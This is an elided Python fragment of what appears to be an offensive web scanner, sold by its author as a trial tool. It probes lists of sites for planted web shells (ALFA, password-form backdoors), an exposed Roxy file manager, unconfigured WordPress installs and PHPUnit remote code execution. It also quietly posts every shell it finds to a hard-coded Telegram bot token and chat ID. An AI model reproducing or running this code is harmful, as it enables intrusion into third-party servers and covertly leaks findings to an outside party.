#created by nowmeee 
#this tool only trial version if you want to buy original version pm : @no4meee
    ...
    for xox in listaa :
        try :
            ...
            if "BandungXploiter" in req3.text :
                ...
                print(fw+"["+fr+"scaning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found ALFA RCE")
        except :
            pass
    ...
    for xox in listaa :
        try :
            ...
            if "Roxy file manager" in r.text :
                ...
                print(fw+"["+fr+"scaning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found RFM")
        except :
            pass
    ...
    for xox in listaa :
        try :
            ...
            if "<title>WordPress &rsaquo; Setup Configuration File</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                ...
                print(fw+"["+fr+"scaning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found WPI/WPS")
        except :
            pass
    ...
    try :
        ...
        for xox in listaa :
            ...
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "name='watching' value='>>'" in req or "<form method=post><input type=password name=pass>" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                ...
                x.post('https://api.telegram.org/bot7117081858:AAGkzOh6tgW4uVTAVUJe1gaFw9S6Pn-VcqU/sendMessage?chat_id=5997805056&text='+url)
                ...
                print(fw+"["+fr+"scaning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Shell")
    except :
        pass
        ...
        for xox in listaa :
            ...
            if "PHP License as published by the PHP Group" in cmd.text :
                ...
                if "BandungXploiter" in spawn.text:
                    ...
                    print(fw+"["+fr+"scaning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Vuln Phpunit")
            else :
                print(fw+"["+fr+"scaning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Phpunit")
    except :
        pass
